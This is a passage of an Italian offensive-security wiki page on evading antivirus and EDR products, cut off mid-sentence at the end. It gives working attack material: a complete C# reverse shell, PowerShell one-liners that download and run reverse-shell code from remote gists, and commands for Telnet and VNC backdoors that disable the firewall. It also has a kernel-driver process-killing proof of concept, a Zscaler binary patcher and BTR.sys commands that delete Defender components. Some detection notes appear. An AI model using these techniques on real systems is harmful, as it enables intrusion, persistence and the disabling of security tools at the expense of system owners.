- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visualizzato questa schermata scaricando alcuni eseguibili da Internet ed eseguendoli.

Microsoft Defender SmartScreen è un meccanismo di sicurezza progettato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente tramite un approccio basato sulla reputazione: le applicazioni scaricate raramente attiveranno SmartScreen, che avviserà l'utente finale e impedirà l'esecuzione del file (anche se il file può comunque essere eseguito facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier, creato automaticamente quando si scaricano file da Internet, insieme all'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verifica dell'ADS Zone.Identifier per un file scaricato da Internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire ai payload di ottenere il Mark of The Web consiste nel pacchettarli all'interno di una sorta di container, come un ISO. Questo accade perché il Mark-of-the-Web (MOTW) **non può** essere applicato ai volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è un tool che pacchettizza i payload in container di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando i payload all'interno di file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere utilizzato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

Analogamente a come viene disabilitato (bypassato) AMSI, è anche possibile fare in modo che la funzione **`EtwEventWrite`** del processo user space ritorni immediatamente senza registrare eventi. Questo viene fatto patchando la funzione in memoria affinché ritorni immediatamente, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare maggiori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Il caricamento di binari C# in memoria è noto da molto tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza farti rilevare dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci soltanto di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) fornisce già la possibilità di eseguire assembly C# direttamente in memoria, ma esistono diversi modi per farlo:

- **Fork\&Run**

Consiste nello **spawnare un nuovo processo sacrificale**, iniettare il tuo codice malevolo di post-exploitation in quel nuovo processo, eseguire il codice malevolo e, al termine, terminare il nuovo processo. Questo presenta sia vantaggi sia svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del processo del nostro Beacon implant. Ciò significa che, se qualcosa va storto o viene rilevato durante la nostra attività di post-exploitation, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva**. Lo svantaggio è che c'è una **probabilità maggiore** di essere rilevati dalle **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice malevolo di post-exploitation **nel proprio processo**. In questo modo puoi evitare di dover creare un nuovo processo e farlo analizzare dall'AV, ma lo svantaggio è che, se qualcosa va storto durante l'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon**, poiché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi saperne di più sul caricamento di C# Assembly, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**; consulta [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi, fornendo alla macchina compromessa l'accesso **all'ambiente dell'interprete installato sulla condivisione SMB controllata dall'Attacker**.

Consentendo l'accesso ai binari dell'interprete e all'ambiente sulla condivisione SMB, puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repo indica quanto segue: Defender continua a scansionare gli script, ma utilizzando Go, Java, PHP ecc. abbiamo **maggiore flessibilità nel bypassare le signature statiche**. I test con script reverse shell casuali e non offuscati in questi linguaggi hanno dato risultati positivi.

## TokenStomping

Il token stomping manipola l'access token di un prodotto di sicurezza come un EDR o un AV. Ridurre i privilegi del token può lasciare il processo in esecuzione, impedendogli al contempo di eseguire attività privilegiate di ispezione o remediation.

Per impedirlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**questo blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop sul PC della vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:<sup>[[35]](#references)</sup>
1. Scarica da https://remotedesktop.google.com/, fai clic su "Set up via SSH", quindi fai clic sul file MSI per Windows per scaricarlo.
2. Esegui silenziosamente l'installer sulla vittima (sono richiesti privilegi di amministratore): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e fai clic su next. La procedura guidata ti chiederà quindi di autorizzare; fai clic sul pulsante Authorize per continuare.
4. Esegui il comando fornito apportando le modifiche necessarie: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (il parametro `--pin` imposta il PIN senza usare la GUI).


## Advanced Evasion

L'evasion è un argomento molto complesso; a volte devi tenere conto di molte fonti diverse di telemetry su un singolo sistema, quindi è praticamente impossibile rimanere completamente inosservati in ambienti maturi.

Ogni ambiente contro cui operi avrà i propri punti di forza e le proprie debolezze.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per acquisire una base sulle tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Tecniche precedenti**

### **Verificare quali parti Defender rileva come malevole**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuoverà parti del binario** finché non **scoprirà quale parte Defender** sta rilevando come malevola, indicandotela.\
Un altro strumento che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred), con un servizio web disponibile all'indirizzo [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutti i sistemi Windows includevano un **Telnet server** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **avviare** all'avvio del sistema ed **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) **e disabilita il firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (sono necessari i download binari, non il setup)

**SULL'HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Sposta quindi il binario _**winvnc.exe**_ e il file **UltraVNC.ini** appena creato all'interno della **vittima**

#### **Reverse connection**

L'**attacker** deve **eseguire all'interno del proprio** **host** il binario `vncviewer.exe -listen 5900`, così sarà **preparato** a ricevere una **connessione VNC** reverse. Quindi, all'interno della **vittima**: avvia il daemon winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth, non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione, altrimenti attiverai un [popup](https://i.imgur.com/1SROTTl.png). Verifica se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory, altrimenti si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per visualizzare l'help, altrimenti attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il listener** con `msfconsole -r file.rc` ed **esegui** il **payload XML** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale defender terminerà il processo molto rapidamente.**

### Compilazione del nostro reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primo C# Revershell

Compilalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatici:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscator C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio di utilizzo di Python per creare injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Terminare AV/EDR dal Kernel Space

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni degli endpoint prima di distribuire il ransomware. Il tool porta con sé il **proprio driver vulnerabile ma *firmato*** e ne abusa per eseguire operazioni privilegiate nel kernel che persino i servizi AV Protected-Process-Light (PPL) non possono bloccare.<sup>[[12]](#references)</sup>

Punti chiave
1. **Driver firmato**: il file consegnato sul disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver presenta una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **kernel service** e la seconda lo avvia, rendendo `\\.\ServiceMouse` accessibile dallo user land.
3. **IOCTL esposti dal driver**
| Codice IOCTL | Funzionalità                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminare un processo arbitrario tramite PID (usato per terminare i servizi Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario dal disco |
| `0x990001D0` | Scaricare il driver e rimuovere il service |

Proof-of-concept minimo in C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**: BYOVD ignora completamente le protezioni user-mode; il codice eseguito nel kernel può aprire processi *protetti*, terminarli o manomettere gli oggetti del kernel indipendentemente da PPL/PP, ELAM o da altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilitare la vulnerable-driver block list di Microsoft (`HVCI`, `Smart App Control`) affinché Windows rifiuti di caricare `AToolsKrnl64.sys`.
•  Monitorare la creazione di nuovi *kernel* service e generare alert quando un driver viene caricato da una directory scrivibile da chiunque o non presente nell’allow-list.
•  Monitorare gli handle user-mode verso custom device object seguiti da chiamate `DeviceIoControl` sospette.

### Bypassing dei controlli Posture di Zscaler Client Connector tramite patching del binario su disco

**Client Connector** di Zscaler applica localmente le regole di device-posture e si affida a Windows RPC per comunicare i risultati agli altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente lato client** (al server viene inviato un booleano).
2. Gli endpoint RPC interni verificano soltanto che l’eseguibile connesso sia **firmato da Zscaler** (tramite `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Tramite il **patching di quattro binari firmati su disco**, entrambi i meccanismi possono essere neutralizzati:

| Binario | Logica originale sottoposta a patch | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi ogni controllo risulta conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | Sostituita con NOP ⇒ qualsiasi processo, anche non firmato, può collegarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita da `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità sul tunnel | Bypassati |

Estratto minimo del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutti** i posture check risultano **verdi/conformi**.
* I binary non firmati o modificati possono aprire gli endpoint RPC named-pipe (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come decisioni di trust esclusivamente client-side e semplici controlli delle firme possano essere aggirati con poche patch ai byte.

## Abuso delle funzionalità trusted di Microsoft Defender `BTR.sys`

Il driver **Boot-Time Removal** di Defender è un utile controesempio al classico BYOVD. `BTR.sys` è un componente di remediation legittimo firmato da Microsoft, privo di bug di memory corruption e di un'interfaccia IOCTL; dopo aver ottenuto accesso amministrativo e `SeLoadDriverPrivilege`, un operatore può invece falsificare la propria transazione privata di remediation e ottenere le operazioni previste su file/registro in Ring-0. Si tratta di una **post-compromise AV/EDR-neutralization primitive, non di initial access o privilege escalation**, e il driver può essere estratto dalla risorsa `BOOTTIMETOOL` del file `MpEngine.dll` dello stesso target, invece di importare un driver di terze parti appariscente.<sup>[[36]](#references)</sup>

### Preparazione del driver one-shot

Defender normalmente rilascia la risorsa come file `[a-z]{8}.sys` casuale e registra un kernel service con un nome simile. `DriverEntry` legge il valore `Args` del service, apre l'NTFS ADS indicato, decritta e valida l'action list, scrive il feedback e restituisce `0xC0000056` (`STATUS_DELETE_PENDING`) dopo l'esecuzione corretta, in modo che il driver venga scaricato invece di rimanere residente. Un service falsificato presenta i seguenti valori caratteristici.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
Lo stream `:changelist` contiene un blob crittografato con RC4. Le build analizzate riutilizzano una chiave fissa di 256 byte, quindi la crittografia non costituisce un confine di autorizzazione. Un plaintext valido presenta un global header di 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC dell'header e un transaction ID derivato dal payload), seguito da un feedback path UTF-16 con terminazione null e da un numero qualsiasi di item. Ogni item presenta un header di 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) più dati specifici dell'azione che terminano con **esattamente quattro byte NUL**. Ogni regione header/dati viene verificata indipendentemente con il polinomio CRC-32 `0xEDB88320`, stato iniziale `0xFFFFFFFF` e **nessun XOR finale** (`~CRC32`); lo stato CRC viene reimpostato per ogni regione.<sup>[[36]](#references)[[37]](#references)</sup>

Gli action ID accettati espongono queste primitive del kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dati dell'item | Risultato |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Eliminare un file, incluso un file bloccato |
| 2 | `[UTF-16 path]` | Rimuovere una directory vuota |
| 3 | `[Flags][source][destination]` | Spostare un file in un protected path scelto dall'attaccante; una destinazione vuota significa eliminare |
| 4 | `[Flags][key path]` | Eliminare ricorsivamente una chiave del registro |
| 5 | `[Flags][key path + "\\" + value]` | Eliminare un valore del registro |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Creare/aggiornare un valore del registro e creare i key path mancanti |

Per le azioni 5 e 6, il separatore key/value on-wire è **due backslash consecutive**; un path formattato in modo convenzionale non verrà suddiviso correttamente. Il feedback file rispecchia principalmente la richiesta, ma i primi quattro byte di dati di ogni item diventano il relativo `NTSTATUS` risultante. Per le azioni 1 e 2, che non hanno un campo flags iniziale, BTR sposta il path nei quattro byte finali riservati per fare spazio a quello status.<sup>[[36]](#references)</sup>

### Workflow di `BTR_CLI` e finestra early-boot

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa l'intera catena: estrarre `BTR.sys` da Defender locale, creare `<random>.sys:changelist` e uno stream di feedback, serializzare/verificare il checksum/crittografare azioni concatenate, creare direttamente la chiave del registro del servizio, quindi chiamare `NtLoadDriver` per `-trigger now` oppure lasciare il driver come system-start per `-trigger boot`. Lo staging diretto nel registro evita il normale percorso SCM `CreateServiceW` e pertanto **non** produce l'Event ID 7045 di installazione del servizio. Gli artefatti attivati al boot possono in seguito essere rimossi con `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` non è utilizzabile perché BTR esegue operazioni di I/O sui file da `DriverEntry`, prima che lo storage stack e il link `SystemRoot` siano pronti. `Start=1`, insieme al gruppo ad alta priorità `Boot Bus Extender`, viene invece eseguito nella Phase 1: NTFS è utilizzabile, ma molti security driver avviati dal sistema e servizi EDR in user mode non sono ancora stati inizializzati. I filtri avviati al boot, come `WdFilter`, potrebbero essere già caricati, tuttavia BTR può rimuovere i relativi binari o la configurazione del servizio prima dell'avvio successivo e può eliminare gli eseguibili dei servizi prima che SCM li avvii. ELAM non colma questa lacuna perché BTR viene eseguito dopo la valutazione dei driver avviati al boot e dispone di una firma Microsoft valida.<sup>[[36]](#references)</sup>

Più azioni vengono eseguite in un'unica transazione. Il PoC antepone Action 1 per il percorso hard-coded `\SystemRoot\Temp\BootClean.log`: BTR crea questo log, poi consuma la propria richiesta di eliminazione e lo rimuove prima di terminare. Questo riduce le evidenze, mentre collocare il feedback in `<random>.sys:<random>.dat` consente di rimuovere insieme il driver e entrambi gli stream.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlazioni di rilevamento ad alto segnale

Le regole basate esclusivamente sulla firma e la Microsoft vulnerable-driver blocklist non affrontano l'abuso delle funzionalità previste di BTR. Sono da preferire le seguenti correlazioni comportamentali, distinguendo al contempo la lineage legittima di Defender da un launcher arbitrario.<sup>[[36]](#references)</sup>

- **Sysmon 15:** la creazione di `.sys:changelist` è universale per lo staging di BTR. Un ADS `.dat` associato allo stesso `.sys` è particolarmente sospetto, perché Defender normalmente colloca il feedback sotto `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 senza System 7045:** correlare la creazione diretta di `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenente `Args=...:changelist` e `Group=Boot Bus Extender` senza un evento di installazione SCM corrispondente.
- **Sysmon 6 -> 23:** correlare il caricamento di un driver BTR noto proveniente da una lineage non appartenente a Defender con la successiva eliminazione del file attribuita a `System`/PID 4, in particolare per i security binary.
- **Sysmon 11 -> 23:** generare un alert per la rapida creazione ed eliminazione di `\SystemRoot\Temp\BootClean.log` da parte di `System`/PID 4.
- Limitare e sottoporre ad audit l'assegnazione/abilitazione di `SeLoadDriverPrivilege`; una firma Microsoft da sola non è sufficiente per garantire l'affidabilità quando il driver di uno strumento di sicurezza viene sottoposto a staging da `cmd.exe`, PowerShell o un processo sconosciuto.

## Abusare di Protected Process Light (PPL) per manomettere AV/EDR con LOLBINs

Protected Process Light (PPL) applica una gerarchia signer/level, così che solo i processi protetti con un livello uguale o superiore possano manomettersi a vicenda. Dal punto di vista offensivo, se è possibile avviare legittimamente un binary abilitato per PPL e controllarne gli argomenti, è possibile trasformare una funzionalità benigna (ad esempio il logging) in una write primitive vincolata e supportata da PPL contro le directory protette utilizzate da AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Cosa fa eseguire un processo come PPL
- L'EXE di destinazione (e tutte le DLL caricate) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un livello di protezione compatibile con il signer del binary (ad esempio `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per i signer antimalware, `PROTECTION_LEVEL_WINDOWS` per i signer Windows). Livelli errati causeranno il fallimento della creazione.

Vedi anche un'introduzione più ampia a PP/PPL e alla protezione di LSASS qui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti di launcher
- Helper open-source: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti all'EXE di destinazione):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Pattern di utilizzo:
```text
